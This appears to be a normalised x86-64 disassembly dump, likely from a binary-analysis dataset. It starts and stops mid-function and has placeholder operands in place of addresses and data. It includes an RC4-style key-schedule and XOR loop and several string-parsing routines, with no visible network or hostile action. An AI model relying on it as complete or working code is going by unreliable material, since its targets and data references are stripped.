call sub_404d90
mov eax [ rbp + 0x34 ]
cmp eax 0x1
jne r-xdata
lea rax [ rw-data ]
mov rcx rax
lea rdx [ rbp + 0x154 ]
mov r8d 0x32
call sub_404ae0
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x38 ]
lea rdx [ rbp + 0x154 ]
mov r8d 0x32
call sub_404ae0
jmp r-xdata
movsxd rax ebx
mov [ rax + rbp + 0x54 ] bl
add ebx 0x1
cmp ebx 0x100
jne r-xdata
nop
xor rsi rsi
xor rbx rbx
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x48 ]
call sub_412650
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_412680
mov rcx [ rbp + 0x48 ]
mov eax eax
movzx rax [ rcx + rax - 0x2 ]
mov [ rbp + 0x186 ] al
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x40 ]
call sub_412650
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_412680
mov rcx [ rbp + 0x40 ]
mov eax eax
movzx rax [ rcx + rax - 0x1 ]
mov [ rbp + 0x187 ] al
xor rbx rbx
mov ecx 0x34
mov eax ebx
cdq
idiv ecx
movsxd rdx edx
movzx rax [ rdx + rbp + 0x154 ]
add esi eax
movsxd rax ebx
movzx rax [ rax + rbp + 0x54 ]
add esi eax
mov ecx 0x100
mov eax esi
cdq
idiv ecx
mov rsi rdx
movsxd rax ebx
movzx r13 [ rax + rbp + 0x54 ]
movsxd rax ebx
movsxd rcx esi
movzx rcx [ rcx + rbp + 0x54 ]
mov [ rax + rbp + 0x54 ] cl
movsxd rax esi
mov [ rax + rbp + 0x54 ] r13b
add ebx 0x1
cmp ebx 0x100
jne r-xdata
nop
xor rbx rbx
xor rsi rsi
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
call sub_412680
lea rcx [ rbp + 0x188 ]
mov rdx [ r-xdata ]
mov r8d 0x1
mov r9d eax
sub r9d 0x2
mov r9d r9d
call sub_409850
mov rcx [ rbp + 0x188 ]
call sub_4094d0
mov rcx [ rbp + 0x188 ]
mov rdx rax
xor r8 r8
call sub_404d90
mov rcx [ rbp + 0x188 ]
call sub_4094d0
xor rdi rdi
mov r14d eax
sub r14d 0x1
cmp edi r14d
jg r-xdata
nop
mov rcx [ rbp + 0x188 ]
call sub_4094d0
mov rcx [ rbp + 0x28 ]
mov rcx [ rcx + 0x8 ]
mov rdx [ rbp + 0x188 ]
mov r8d eax
call sub_4125e0
mov al 0x1
mov [ rbp + 0x33 ] al
nop
lea rcx [ rbp + 0x38 ]
mov rdx [ r-xdata ]
mov r8d 0x3
call sub_408f10
lea rcx [ rbp + 0x188 ]
mov rdx [ r-xdata ]
call sub_409890
movzx rax [ rbp + 0x33 ]
lea rsp [ rbp + 0x198 ]
pop rbx
pop rsi
pop rdi
pop r13
pop r14
pop rbp
retn
add r14d 0x1
mov eax ebx
add eax 0x1
mov ecx 0x100
cdq
idiv ecx
mov rbx rdx
movsxd rax ebx
movzx rax [ rax + rbp + 0x54 ]
add esi eax
mov ecx 0x100
mov eax esi
cdq
idiv ecx
mov rsi rdx
movsxd rax esi
movzx r13 [ rax + rbp + 0x54 ]
movsxd rax esi
movsxd rcx ebx
movzx rcx [ rcx + rbp + 0x54 ]
mov [ rax + rbp + 0x54 ] cl
movsxd rax ebx
mov [ rax + rbp + 0x54 ] r13b
mov rax [ rbp + 0x28 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x38 ]
call sub_412650
mov rcx [ rbp + 0x188 ]
movsxd r8 edi
mov r9 [ rbp + 0x38 ]
movsxd r10 edi
movzx rax r13b
movsxd rdx esi
movzx rdx [ rdx + rbp + 0x54 ]
add eax edx
mov r11d 0x100
xor edx edx
div r11d
mov edx edx
movzx rax [ r9 + r10 ]
xor al [ rdx + rbp + 0x54 ]
mov [ rcx + r8 ] al
add edi 0x1
cmp edi r14d
jne r-xdata
sub_40f8a0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x38 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
mov r8d 0x3
call sub_408f10
lea rax [ rbx + rbp + 0x188 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
call sub_409890
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_40f900
push rbp
push rbx
sub rsp 0x88
mov rbp rsp
mov [ rbp + 0x38 ] rcx
mov [ rbp + 0x44 ] edx
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0xb0 ] r8
mov rcx [ rbp + 0xb0 ]
call sub_4078c0
nop
xor rax rax
mov [ rbp + 0x37 ] al
xor rax rax
mov rcx [ rbp + 0x38 ]
mov rcx [ rcx + 0x28 ]
mov edx [ rbp + 0x44 ]
movsxd rdx edx
cmp [ rcx + rdx * 8 ] 0x0
je r-xdata
lea rcx [ rbp + 0x68 ]
mov rdx [ rbp + 0x38 ]
mov rdx [ rdx + 0x28 ]
mov r8d [ rbp + 0x44 ]
movsxd r8 r8d
mov rdx [ rdx + r8 * 8 ]
mov r8d 0x8
mov r9d eax
sub r9d 0x8
movsxd r9 r9d
call sub_408510
lea rcx [ rbp + 0x50 ]
mov rdx [ rbp + 0xb0 ]
xor r8 r8
call sub_408720
mov rcx [ rbp + 0x38 ]
lea rdx [ rbp + 0x58 ]
mov r8 [ rbp + 0x50 ]
call sub_40f010
lea rcx [ rbp + 0x60 ]
mov edx 0x3
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x58 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_4083b0
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
mov rdx [ rbp + 0x68 ]
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x60 ]
call sub_412740
test al al
je r-xdata
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x28 ]
mov ecx [ rbp + 0x44 ]
movsxd rcx ecx
mov rax [ rax + rcx * 8 ]
mov eax [ rax - 0x4 ]
lea rcx [ rbp + 0x78 ]
xor rdx rdx
xor r8 r8
call sub_408650
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
call sub_412690
nop
lea rcx [ rbp + 0x48 ]
mov rdx [ r-xdata ]
call sub_409890
lea rcx [ rbp + 0x50 ]
mov edx 0x4
call sub_407840
lea rcx [ rbp + 0x78 ]
call sub_407780
lea rcx [ rbp + 0xb0 ]
call sub_407730
movzx rax [ rbp + 0x37 ]
lea rsp [ rbp + 0x88 ]
pop rbx
pop rbp
retn
lea rcx [ rbp + 0x78 ]
mov edx 0x4
xor r8 r8
call sub_408650
lea rcx [ rbp + 0x78 ]
call sub_407e70
mov rbx rax
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x48 ]
call sub_412650
mov rax [ rbp + 0x48 ]
mov rcx rax
mov rdx rbx
mov r8d 0x4
call sub_404ae0
mov rcx [ rbp + 0x78 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
jne r-xdata
mov al 0x1
mov [ rbp + 0x37 ] al
sub_40fae0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
call sub_409890
lea rax [ rbx + rbp + 0x50 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x4
call sub_407840
lea rax [ rbx + rbp + 0x78 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0xb0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_40fbc0
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x140
mov rbp rsp
mov [ rbp + 0x38 ] rcx
mov [ rbp + 0x44 ] edx
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0x70 ] 0x0
mov [ rbp + 0x80 ] 0x0
mov [ rbp + 0x90 ] 0x0
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0xa0 ] 0x0
mov [ rbp + 0x98 ] 0x0
mov [ rbp + 0xb8 ] 0x0
mov [ rbp + 0xb0 ] 0x0
mov [ rbp + 0xa8 ] 0x0
mov [ rbp + 0xc0 ] 0x0
mov [ rbp + 0xc8 ] 0x0
mov [ rbp + 0xe0 ] 0x0
mov [ rbp + 0xd0 ] 0x0
mov [ rbp + 0xd8 ] 0x0
mov [ rbp + 0xe8 ] 0x0
mov [ rbp + 0xf0 ] 0x0
mov [ rbp + 0xf8 ] 0x0
mov [ rbp + 0x138 ] 0x0
mov [ rbp + 0x128 ] 0x0
mov [ rbp + 0x118 ] 0x0
mov [ rbp + 0x110 ] 0x0
mov [ rbp + 0x108 ] 0x0
nop
mov ebx [ rbp + 0x44 ]
xor rax rax
mov [ rbp + 0x43 ] al
lea rcx [ rbp + 0xf8 ]
mov rax [ rbp + 0x38 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x38 ]
mov edx ebx
lea r8 [ r-xdata ]
mov r9 [ rbp + 0xf8 ]
call sub_40ece0
test al al
je r-xdata
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
call sub_412690
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0xf0 ]
call sub_412650
cmp [ rbp + 0xf0 ] 0x0
je r-xdata
nop
lea rcx [ rbp + 0x50 ]
call sub_407780
lea rcx [ rbp + 0x58 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0x68 ]
call sub_407780
lea rcx [ rbp + 0x70 ]
call sub_407730
lea rcx [ rbp + 0x78 ]
mov edx 0x2
call sub_407840
lea rcx [ rbp + 0x88 ]
mov edx 0x5
call sub_407810
lea rcx [ rbp + 0xb0 ]
mov edx 0x3
call sub_407840
lea rcx [ rbp + 0xc8 ]
mov edx 0x3
call sub_407810
lea rcx [ rbp + 0xe0 ]
call sub_407780
lea rcx [ rbp + 0xe8 ]
mov rdx [ r-xdata ]
mov r8d 0x2
call sub_408f10
lea rcx [ rbp + 0xf8 ]
call sub_407730
lea rcx [ rbp + 0x108 ]
call sub_407780
lea rcx [ rbp + 0x110 ]
mov rdx [ r-xdata ]
mov r8d 0x2
call sub_408f10
lea rcx [ rbp + 0x128 ]
call sub_407780
lea rcx [ rbp + 0x138 ]
mov rdx [ r-xdata ]
call sub_409890
movzx rax [ rbp + 0x43 ]
lea rsp [ rbp + 0x140 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
call sub_412680
test eax eax
je r-xdata
mov rax [ rbp + 0x38 ]
cmp [ rax + 0x40 ] 0x0
je r-xdata
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0xe8 ]
call sub_412650
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
call sub_412680
mov rcx [ r-xdata ]
mov dl 0x1
mov r8 [ rbp + 0xe8 ]
mov r9d eax
call sub_412cd0
mov [ rbp + 0x48 ] rax
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
call sub_412690
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x138 ]
call sub_4132e0
mov rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0x138 ]
lea r8 [ rbp + 0x134 ]
lea r9 [ rbp + 0x130 ]
lea rax [ rbp + 0x118 ]
mov [ rsp + 0x20 ] rax
lea rax [ rbp + 0x110 ]
mov [ rsp + 0x28 ] rax
call sub_413590
cmp [ rbp + 0x134 ] 0x0
je r-xdata
mov rax [ rbp + 0x38 ]
cmp [ rax + 0x34 ] 0x0
je r-xdata
mov rax [ rbp + 0x38 ]
cmp [ rax + 0x20 ] 0x0
je r-xdata
mov rcx [ rbp + 0x48 ]
lea r8 [ r-xdata ]
lea r9 [ r-xdata ]
mov r10d 0x3e8
mov rax [ rbp + 0x38 ]
mov eax [ rax + 0x30 ]
xor edx edx
div r10d
mov rdx r8
mov r8 r9
mov r9d eax
call sub_413f60
imul eax eax 0x3e8
mov rcx [ rbp + 0x38 ]
mov [ rcx + 0x30 ] eax
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x128 ]
lea r8 [ r-xdata ]
lea r9 [ r-xdata ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_413770
mov rcx [ rbp + 0x128 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
je r-xdata
mov rcx [ rbp + 0x38 ]
mov edx 0x1
call sub_40f5a0
mov rax [ rbp + 0x38 ]
lea rcx [ rax + 0x20 ]
mov rdx [ r-xdata ]
mov r8d 0x1
movsxd r9 [ rbp + 0x130 ]
call sub_409850
xor rbx rbx
mov edi [ rbp + 0x130 ]
sub edi 0x1
cmp ebx edi
jg r-xdata
mov rax [ rbp + 0x38 ]
lea rcx [ rax + 0x20 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov rax [ rbp + 0x38 ]
mov [ rax + 0x40 ] 0x0
lea rcx [ rax + 0x38 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
lea rcx [ rbp + 0x128 ]
lea rdx [ r-xdata ]
call sub_408020
xor rsi rsi
xor rax rax
cmp [ rbp + 0x128 ] 0x0
je r-xdata
nop
mov rcx [ rbp + 0x48 ]
mov dl 0x1
mov rax [ rbp + 0x48 ]
mov rbx [ rax ]
call [ rbx - 0x20 ]
lea rcx [ rbp + 0x138 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
lea rcx [ rbp + 0x118 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
lea rcx [ rbp + 0x110 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
jmp r-xdata
add edi 0x1
mov ebx 0x1
mov edi eax
cmp ebx edi
jg r-xdata
mov rax [ rbp + 0x128 ]
mov eax [ rax - 0x4 ]
lea rcx [ rbp + 0x88 ]
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rdx ebx
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x8 ]
call sub_408950
lea rcx [ rbp + 0x90 ]
mov rdx [ rbp + 0x88 ]
call sub_4140a0
mov rcx [ rbp + 0x90 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
jne r-xdata
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov [ rax + rcx * 8 + 0x10 ] 0x0
jmp r-xdata
nop
mov rax [ rbp + 0x38 ]
mov [ rax + 0x40 ] esi
lea rcx [ rax + 0x38 ]
mov rdx [ r-xdata ]
mov r8d 0x1
movsxd r9 esi
call sub_409850
xor rbx rbx
sub esi 0x1
cmp ebx esi
jg r-xdata
add edi 0x1
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov [ rax + rcx * 8 + 0x10 ] 0x2
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov [ rax + rcx * 8 + 0x10 ] 0x1
jmp r-xdata
mov rcx [ rbp + 0x48 ]
mov rax [ rbp + 0x110 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
lea r8 [ r-xdata ]
xor r9 r9
call sub_413f60
mov rcx [ rbp + 0x38 ]
mov rcx [ rcx + 0x20 ]
movsxd rdx ebx
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov [ rcx + rdx * 8 + 0x14 ] al
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x80 ]
mov rax [ rbp + 0x110 ]
movsxd r8 ebx
mov r8 [ rax + r8 * 8 ]
lea r9 [ r-xdata ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_413770
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
lea rcx [ rax + rcx * 8 + 0x18 ]
mov rdx [ rbp + 0x80 ]
call sub_407ca0
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov rax [ rax + rcx * 8 + 0x18 ]
cmp [ rax ] 0x25
jne r-xdata
nop
add esi 0x1
mov rax [ rbp + 0x128 ]
movsxd rcx ebx
cmp [ rax + rcx - 0x1 ] 0x20
jne r-xdata
add esi 0x1
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x50 ]
mov rax [ rbp + 0x110 ]
movsxd r8 ebx
mov r8 [ rax + r8 * 8 ]
lea r9 [ r-xdata ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_413770
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
lea rcx [ rax + rcx * 8 + 0x20 ]
mov rdx [ rbp + 0x50 ]
call sub_407ca0
mov rcx [ rbp + 0x48 ]
mov rax [ rbp + 0x110 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
lea r8 [ r-xdata ]
xor r9 r9
call sub_413f60
mov rcx [ rbp + 0x38 ]
mov rcx [ rcx + 0x20 ]
movsxd rdx ebx
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov [ rcx + rdx * 8 + 0x28 ] al
mov rcx [ rbp + 0x48 ]
mov rax [ rbp + 0x110 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
lea r8 [ r-xdata ]
xor r9 r9
call sub_413f60
mov rcx [ rbp + 0x38 ]
mov rcx [ rcx + 0x20 ]
movsxd rdx ebx
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov [ rcx + rdx * 8 + 0x29 ] al
mov rcx [ rbp + 0x48 ]
mov rax [ rbp + 0x110 ]
movsxd rdx ebx
mov rdx [ rax + rdx * 8 ]
lea r8 [ r-xdata ]
mov r9d 0x258
call sub_413f60
mov rcx [ rbp + 0x38 ]
mov rcx [ rcx + 0x20 ]
movsxd rdx ebx
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov [ rcx + rdx * 8 + 0x2c ] eax
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov rcx [ rax + rcx * 8 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
je r-xdata
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
lea rcx [ rax + rcx * 8 + 0x18 ]
mov edx 0x1
mov r8d 0x1
call sub_408590
lea rcx [ rbp + 0x70 ]
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rdx ebx
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x18 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x70 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x78 ]
mov rdx [ rbp + 0x38 ]
mov rdx [ rdx + 0x20 ]
movsxd r8 ebx
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov rdx [ rdx + r8 * 8 + 0x18 ]
mov r8d 0x1
mov r9d eax
sub r9d 0x1
movsxd r9 r9d
call sub_408510
mov rcx [ rbp + 0x38 ]
lea rdx [ rbp + 0x108 ]
mov r8 [ rbp + 0x78 ]
call sub_410ed0
xor rsi rsi
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
cmp [ rax + rcx * 8 + 0x18 ] 0x0
je r-xdata
lea rcx [ rbp + 0xd8 ]
mov rdx [ rbp + 0x128 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0xd8 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0xe0 ]
mov rdx [ rbp + 0x128 ]
mov r8d 0x1
mov r9d eax
sub r9d 0x1
movsxd r9 r9d
call sub_408510
lea rcx [ rbp + 0xd0 ]
mov rdx [ rbp + 0xe0 ]
call sub_408950
mov rcx [ rbp + 0xd0 ]
lea rdx [ rbp + 0x124 ]
call sub_404e60
mov rcx [ rbp + 0x38 ]
mov rcx [ rcx + 0x38 ]
movsxd rdx ebx
mov [ rcx + rdx ] al
lea rcx [ rbp + 0xc8 ]
mov rdx [ rbp + 0x128 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0xc8 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x128 ]
mov edx 0x1
mov r8d eax
call sub_408590
add ebx 0x1
cmp ebx esi
jne r-xdata
add ebx 0x1
cmp ebx edi
jne r-xdata
lea rcx [ rbp + 0x128 ]
mov edx ebx
mov r8d 0x1
call sub_408590
add ebx 0x1
cmp ebx edi
jne r-xdata
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov rcx [ rax + rcx * 8 + 0x8 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
je r-xdata
lea rcx [ rbp + 0x60 ]
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rdx ebx
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x18 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x60 ]
mov r8d 0x1
call sub_408db0
mov r13d eax
lea rcx [ rbp + 0x58 ]
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rdx ebx
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x18 ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x58 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x68 ]
mov rdx [ rbp + 0x38 ]
mov rdx [ rdx + 0x20 ]
movsxd r8 ebx
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov rdx [ rdx + r8 * 8 + 0x18 ]
mov r8d r13d
add r8d 0x2
movsxd r8 r8d
mov r9d esi
sub r9d eax
sub r9d 0x1
movsxd r9 r9d
call sub_408510
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
lea rcx [ rax + rcx * 8 + 0x18 ]
mov rdx [ rbp + 0x108 ]
mov r8 [ rbp + 0x68 ]
call sub_408120
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov rax [ rax + rcx * 8 + 0x18 ]
mov esi [ rax - 0x4 ]
mov rax [ rbp + 0x128 ]
movsxd rcx ebx
cmp [ rax + rcx - 0x1 ] 0x2c
jne r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0xc0 ]
mov rax [ rbp + 0x110 ]
movsxd r8 ebx
mov r8 [ rax + r8 * 8 ]
lea r9 [ r-xdata ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_413770
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
lea rcx [ rax + rcx * 8 ]
mov rdx [ rbp + 0xc0 ]
call sub_407ca0
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0xb0 ]
mov rax [ rbp + 0x110 ]
movsxd r8 ebx
mov r8 [ rax + r8 * 8 ]
lea r9 [ r-xdata ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_413770
lea rcx [ rbp + 0xa8 ]
mov rdx [ rbp + 0xb0 ]
call sub_408950
mov rcx [ rbp + 0x38 ]
lea rdx [ rbp + 0xb8 ]
mov r8 [ rbp + 0xa8 ]
call sub_410ab0
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rcx ebx
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
lea rcx [ rax + rcx * 8 + 0x8 ]
mov rdx [ rbp + 0xb8 ]
call sub_407ca0
lea rcx [ rbp + 0x98 ]
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x20 ]
movsxd rdx ebx
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x8 ]
call sub_408950
lea rcx [ rbp + 0xa0 ]
mov rdx [ rbp + 0x98 ]
call sub_4140a0
mov rcx [ rbp + 0xa0 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
jne r-xdata
mov al 0x1
mov [ rbp + 0x43 ] al
sub_410790
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x50 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x68 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x70 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rax [ rbx + rbp + 0x78 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rax [ rbx + rbp + 0x88 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x5
call sub_407810
lea rax [ rbx + rbp + 0xb0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rax [ rbx + rbp + 0xc8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407810
lea rax [ rbx + rbp + 0xe0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0xe8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
mov r8d 0x2
call sub_408f10
lea rax [ rbx + rbp + 0xf8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rax [ rbx + rbp + 0x108 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x110 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
mov r8d 0x2
call sub_408f10
lea rax [ rbx + rbp + 0x128 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x138 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
call sub_409890
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_410ab0
push rbp
push rsi
push rbx
sub rsp 0x90
mov rbp rsp
mov [ rbp + 0x30 ] rcx
mov [ rbp + 0x28 ] rdx
mov [ rbp + 0x38 ] 0x0
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0x70 ] 0x0
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0x80 ] 0x0
mov [ rbp + 0xc0 ] r8
mov rcx [ rbp + 0xc0 ]
call sub_4078c0
nop
mov rcx [ rbp + 0x28 ]
mov rdx [ rbp + 0xc0 ]
xor r8 r8
call sub_408720
lea rcx [ rbp + 0x70 ]
mov rax [ rbp + 0x28 ]
mov rdx [ rax ]
call sub_408950
lea rcx [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_4140a0
mov rax [ rbp + 0x78 ]
cmp [ rax ] 0x25
jne r-xdata
lea rcx [ rbp + 0x40 ]
mov rdx [ rbp + 0xc0 ]
call sub_4140a0
mov rcx [ rbp + 0x40 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
jne r-xdata
mov rcx [ rbp + 0x28 ]
mov edx 0x1
mov r8d 0x1
call sub_408590
lea rcx [ rbp + 0x60 ]
mov rax [ rbp + 0x28 ]
mov rdx [ rax ]
call sub_408950
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x60 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x68 ]
mov rdx [ rbp + 0x28 ]
mov rdx [ rdx ]
mov r8d 0x1
mov r9d eax
